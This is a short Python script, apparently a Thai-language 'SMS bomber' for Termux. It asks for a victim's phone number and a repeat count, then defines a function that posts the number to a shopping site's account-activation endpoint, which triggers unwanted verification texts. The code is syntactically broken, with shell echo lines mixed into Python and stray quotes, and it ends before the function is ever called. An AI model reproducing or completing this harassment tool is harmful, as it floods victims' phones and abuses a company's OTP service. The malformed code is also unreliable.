import requests
import os
import time
import threading
from threading import Thread
os.system("clear")
time.sleep (1)
print ("\t\x1b[91mรอ")
time.sleep (5)
os.system ("clear")
time.sleep (1)
print ("\x1b[91mกดติดตามด้วยนะคับ")
time.sleep (1)
print ("\x1b[91m")
os.system ("clear")
time.sleep (1)
print("\033[92mํ echo -e "\e[32m   ______                                  _____ __  ________ "
echo -e "  /_  __/__  _________ ___  __  ___  __   / ___//  |/  / ___/ " 
echo -e "   / / / _ \/ ___/ __ '__ \/ / / / |/_/   \__ \/ /|_/ /\__ \ "
echo -e "  / / /  __/ /  / / / / / / /_/ />  <    ___/ / /  / /___/ / "
echo -e " /_/  \___/_/  /_/ /_/ /_/\__,_/_/|_|   /____/_/  /_//____/  \e[0m"
print("")
print("\033[92mhttps://wwwprofile.php?id=100023848152009")
print("")
print("")
print("\033[92mYouTube:บีมTV")
print("list")
print("")
phone = input("\033[95m[+] Number : \033[0m")
num = int(input("\033[95m[+] How : \033[0m"))
os.system("clear")

def test(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print("\033[92m ยิง")
